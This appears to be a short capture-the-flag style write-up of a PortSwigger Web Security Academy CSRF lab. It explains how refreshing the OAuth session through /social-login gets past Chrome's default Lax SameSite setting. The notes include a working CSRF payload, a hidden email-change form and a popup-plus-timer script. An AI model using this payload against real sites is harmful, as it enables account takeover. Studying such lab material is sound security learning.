here we have noticed that SameSite is not specified so by default in chrome it is LAX, so we need to perform a top-level navigation to have a csrf


Another thing we noticed is that the authentication is done with OAUTH and if we trigger a GET to /social-login the oauth is automatically performed and the session cookie is refreshed with a new one


This form is used to perform the email changing
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>



<p>Click anywhere on the page</p>

The idea here is to force the user to refresh the session cookie and the after 5 seconds perform the csrf action
Why it works if we do it before 2 min after the update and then no I don't know

the user must click on the page to open the popup because we canno open the popup directly (disallowed by the browsers)
<script>
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
